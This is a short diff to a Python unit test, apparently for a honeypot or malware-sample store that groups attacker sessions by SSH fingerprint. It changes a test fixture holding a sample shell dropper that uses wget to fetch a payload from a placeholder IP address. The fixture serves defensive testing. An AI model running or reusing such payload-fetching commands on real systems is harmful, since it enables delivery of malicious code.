@@ -295,7 +295,7 @@ class Store(unittest.TestCase):
         hassh = "16443846184eafde36765c9bab2f4397"
         self.h.add_session(self.session(session="campaign-a", ip="198.51.100.7", hassh=hassh))
         self.h.add_session(self.session(session="campaign-b", ip="198.51.100.8", hassh=hassh))
-        data = b"#!/bin/sh\\nwget http://203.0.113.50/payload\\n"
+        data = b"#!/bin/sh\nwget http://203.0.113.50/payload\n"
         ok, sha = self.h.add_sample(data, {"ip": "198.51.100.7"}, quiet=True)
         self.assertTrue(ok)
         self.h.add_sample(data, {"ip": "198.51.100.8"}, quiet=True)
